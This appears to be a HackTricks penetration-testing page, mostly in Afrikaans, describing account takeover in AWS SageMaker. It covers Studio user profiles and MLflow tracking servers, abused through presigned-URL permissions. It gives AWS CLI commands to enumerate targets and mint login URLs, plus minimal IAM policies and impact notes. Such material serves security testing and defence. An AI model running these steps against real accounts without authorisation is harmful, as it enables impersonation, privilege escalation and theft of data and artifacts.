# AWS - SageMaker Unauthorized Access

{{#include ../../../../banners/hacktricks-training.md}}

## SageMaker Studio - Account Takeover via CreatePresignedDomainUrl (Impersonate Any UserProfile)

### Description
'n identiteit met toestemming om `sagemaker:CreatePresignedDomainUrl` aan te roep op 'n geteikende Studio `UserProfile` kan 'n aanmeld-URL genereer wat direk in SageMaker Studio as daardie profiel autentiseer. Dit verleen die aanvaller se blaaier 'n Studio-sessie wat die profiel se `ExecutionRole`-toestemmings erf en volle toegang tot die profiel se EFS-backed tuisgids en apps. Geen `iam:PassRole` of console-toegang is benodig nie.

### Requirements
- 'n SageMaker Studio `Domain` en 'n geteikende `UserProfile` binne dit.
- Die aanvaller-prinsipaal het `sagemaker:CreatePresignedDomainUrl` nodig op die geteikende `UserProfile` (resource‑level) of `*`.

Minimale beleidsvoorbeeld (beperk tot een `UserProfile`):
```json
{
"Version": "2012-10-17",
"Statement": [
{
"Effect": "Allow",
"Action": "sagemaker:CreatePresignedDomainUrl",
"Resource": "arn:aws:sagemaker:<region>:<account-id>:user-profile/<domain-id>/<user-profile-name>"
}
]
}
```
### Misbruikstappe

1) Enumerate a Studio Domain en UserProfiles wat jy kan target
```bash
DOM=$(aws sagemaker list-domains --query 'Domains[0].DomainId' --output text)
aws sagemaker list-user-profiles --domain-id-equals $DOM
TARGET_USER=<UserProfileName>
```
2) Genereer 'n presigned URL (geldig ~5 minute volgens verstek)
```bash
aws sagemaker create-presigned-domain-url \
--domain-id $DOM \
--user-profile-name $TARGET_USER \
--query AuthorizedUrl --output text
```
3) Maak die teruggegewe URL in 'n blaaier oop om by Studio as die teikengebruiker aan te meld. In 'n Jupyter-terminal binne Studio verifieer die effektiewe identiteit:
```bash
aws sts get-caller-identity
```
Aantekeninge:
- `--landing-uri` kan weggelaat word. Sommige waardes (bv. `app:JupyterLab:/lab`) kan verwerp word, afhangend van die Studio-flavor/weergawe; verstekwaardes herlei gewoonlik na die Studio-huis en daarna na Jupyter.
- Organisasiebeleid/VPC endpoint-beperkings kan steeds netwerktoegang blokkeer; token minting vereis nie console-aanmelding of `iam:PassRole` nie.

### Impak
- Lateral movement and privilege escalation deur enige Studio `UserProfile` aan te neem waarvan die ARN toegelaat word, en sodoende sy `ExecutionRole` en lêerstelsel/apps te erf.

### Bewyse (van 'n beheerde toets)
- Met slegs `sagemaker:CreatePresignedDomainUrl` op 'n teiken-`UserProfile`, het die aanvallerrol suksesvol 'n `AuthorizedUrl` teruggegee soos:
```
https://studio-d-xxxxxxxxxxxx.studio.<region>.sagemaker.aws/auth?token=eyJhbGciOi...
```
- A direct HTTP request responds with a redirect (HTTP 302) to Studio, confirming the URL is valid and active until expiry.

## SageMaker MLflow Tracking Server - ATO via CreatePresignedMlflowTrackingServerUrl

### Beskrywing
'n identiteit met toestemming om `sagemaker:CreatePresignedMlflowTrackingServerUrl` aan te roep vir 'n teiken SageMaker MLflow Tracking Server kan 'n eenmalige presigned URL genereer wat direk by die bestuurde MLflow UI vir daardie server verifieer. Dit gee dieselfde toegang as wat 'n wettige gebruiker sou hê tot die server (bekyk/skep eksperimente en runs, en aflaai/oplaai van artefakte in die server se S3-artefakbewaarplek) sonder konsoletogang of `iam:PassRole`.

### Vereistes
- 'n SageMaker MLflow Tracking Server in die rekening/streek en die naam daarvan.
- Die aanvallende principal benodig `sagemaker:CreatePresignedMlflowTrackingServerUrl` op die teiken MLflow Tracking Server-hulpbron (of `*`).

Minimale beleidsvoorbeeld (beperk tot een Tracking Server):
```json
{
"Version": "2012-10-17",
"Statement": [
{
"Effect": "Allow",
"Action": "sagemaker:CreatePresignedMlflowTrackingServerUrl",
"Resource": "arn:aws:sagemaker:<region>:<account-id>:mlflow-tracking-server/<tracking-server-name>"
}
]
}
```
### Misbruikstappe

1) Enumereer MLflow Tracking Servers wat jy kan teiken en kies een naam
```bash
aws sagemaker list-mlflow-tracking-servers \
--query 'TrackingServerSummaries[].{Name:TrackingServerName,Status:TrackingServerStatus}'
TS_NAME=<tracking-server-name>
```
2) Genereer 'n vooraf-ondertekende MLflow UI URL (geldig vir 'n kort tyd)
```bash
aws sagemaker create-presigned-mlflow-tracking-server-url \
--tracking-server-name "$TS_NAME" \
--expires-in-seconds 300 \
--session-expiration-duration-in-seconds 1800 \
--query AuthorizedUrl --output text
```
3) Open die teruggegewe URL in 'n blaaier om toegang tot die MLflow UI as 'n geauthentiseerde gebruiker vir daardie Tracking Server te kry.

Aantekeninge:
- Die Tracking Server moet in 'n gereed‑toestand wees (bv., `Created/Active`). As dit nog `Creating` is, sal die oproep verwerp word.
- Die presigned URL is vir eenmalige gebruik en kortstondig; genereer 'n nuwe een wanneer nodig.

### Impak
- Direkte toegang tot die bestuurde MLflow UI vir die geteikende Tracking Server, wat dit moontlik maak om eksperimente/runs te besigtig en te wysig, en om artefakte wat in die bediener se gekonfigureerde S3 artifact store gestoor is af te laai of op te laai, binne die toestemmings wat deur die bediener se konfigurasie opgelê word.

{{#include ../../../../banners/hacktricks-training.md}}
